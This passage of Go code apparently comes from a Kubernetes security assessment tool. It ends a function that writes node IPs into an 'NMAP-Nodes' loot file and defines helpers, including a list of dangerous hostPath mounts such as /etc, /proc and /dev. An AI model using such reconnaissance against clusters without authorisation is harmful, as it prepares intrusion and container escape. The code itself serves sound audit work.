		}
	}

	return internal.LootFile{
		Name:     "NMAP-Nodes",
		Contents: strings.Join(content, "\n"),
	}
}

// Helper functions

func getNodeIP(node corev1.Node) string {
	for _, addr := range node.Status.Addresses {
		if addr.Type == corev1.NodeInternalIP {
			return addr.Address
		}
	}
	return ""
}

func isDangerousHostPath(path string) bool {
	dangerousPaths := []string{"/", "/etc", "/var", "/proc", "/sys", "/dev", "/host", "/run", "/boot"}
	for _, dangerous := range dangerousPaths {
		if path == dangerous || strings.HasPrefix(path, dangerous+"/") {
			return true
		}
	}
	return false
}

func extractKeyLabels(labels map[string]string) string {
	keyPrefixes := []string{
		"node-role.kubernetes.io/",
		"kubernetes.io/role",
		"node.kubernetes.io/instance-type",
		"topology.kubernetes.io/zone",
		"topology.kubernetes.io/region",
	}

	var keyLabels []string
	for k, v := range labels {
		for _, prefix := range keyPrefixes {
			if strings.HasPrefix(k, prefix) {
				keyLabels = append(keyLabels, fmt.Sprintf("%s=%s", k, v))
			}
		}
	}

	return strings.Join(keyLabels, ", ")
}

func limitString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

func riskLevelValue(level string) int {
	switch level {
	case "CRITICAL":
		return 4
	case "HIGH":
		return 3
	case "MEDIUM":
		return 2
	case "LOW":
		return 1
	default:
		return 0
	}
}

func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}
